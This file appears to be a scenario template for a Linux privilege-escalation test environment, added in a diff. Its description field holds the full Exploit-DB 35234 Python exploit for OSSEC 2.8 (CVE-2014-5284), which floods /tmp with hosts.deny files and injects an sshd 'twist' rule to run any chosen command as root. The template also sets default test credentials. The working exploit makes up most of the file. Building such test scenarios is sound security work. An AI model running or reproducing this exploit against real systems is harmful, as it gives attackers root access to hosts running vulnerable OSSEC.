@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_35234",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: OSSEC 2.8 - 'hosts.deny' Local Privilege Escalation (CVE-2014-5284;OSVDB-111584)\n\nExploit source code (35234.py):\n```\n#!/usr/bin/python\n# Exploit Title: ossec 2.8 Insecure Temporary File Creation Vulnerability Privilege Escalation\n# Date: 14-11-14\n# Exploit Author: skynet-13\n# Vendor Homepage: www.ossec.net/\n# Software Link: https://github.com/ossec/ossec-hids/archive/2.8.1.tar.gz\n# Version: OSSEC  - 2.8\n# Tested on: Ubunutu x86_64\n# CVE : 2014-5284\n\n# Created from Research by\n# Jeff Petersen\n# Roka Security LLC\n# jpetersen@rokasecurity.com\n# Original info at https://github.com/ossec/ossec-hids/releases/tag/2.8.1\n\n# Run this on target machine and follow instructions to execute command as root\n\nfrom twisted.internet import inotify\nfrom twisted.python import filepath\nfrom twisted.internet import reactor\nimport os\nimport optparse\nimport signal\n\n\nclass HostDenyExploiter(object):\n\n    def __init__(self, path_to_watch, cmd):\n        self.path = path_to_watch\n        self.notifier = inotify.INotify()\n        self.exploit = cmd\n\n    def create_files(self):\n        print \"==============================================\"\n        print \"Creating /tmp/hosts.deny.300 through /tmp/hosts.deny.65536 ...\"\n\n        for i in range(300, 65536):\n            filename = \"/tmp/hosts.deny.%s\" % i\n            f = open(filename, 'w')\n            f.write(\"\")\n            f.close()\n\n    def watch_files(self):\n        print \"==============================================\"\n        print \"Monitoring tmp for file change....\"\n        print \"ssh into the system a few times with an incorrect password\"\n        print \"Then wait for up to 10 mins\"\n        print \"==============================================\"\n        self.notifier.startReading()\n        self.notifier.watch(filepath.FilePath(self.path), callbacks=[self.on_file_change])\n\n    def write_exploit_to_file(self, path):\n        print 'Writing exploit to this file'\n        f = open(str(path).split(\"'\")[1], 'w')\n        f.write(' sshd : ALL : twist %s \\n' % self.exploit)\n        f.close()\n        print \"==============================================\"\n        print \" ssh in again to execute the command\"\n        print \"==============================================\"\n        print \"               End Prog.\"\n        os.kill(os.getpid(), signal.SIGUSR1)\n\n    def on_file_change(self, watch, path, mask):\n        print 'File: ', str(path).split(\"'\")[1], ' has just been modified'\n        self.notifier.stopReading()\n        self.write_exploit_to_file(path)\n\n\nif __name__ == '__main__':\n    parser = optparse.OptionParser(\"usage of program \\n\" + \"-c Command to run as root in quotes\\n\")\n    parser.add_option('-c', dest='cmd', type='string', help='Used to specify a command to run as root')\n    (options, args) = parser.parse_args()\n    cmd = options.cmd\n    if options.cmd is None:\n        print parser.usage\n        exit(0)\n    ex = HostDenyExploiter('/tmp', cmd)\n    ex.create_files()\n    ex.watch_files()\n    reactor.run()\n    exit(0)\n```",
+  "cve": "CVE-2014-5284;OSVDB-111584",
+  "exploitdb_id": "35234",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_35234",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
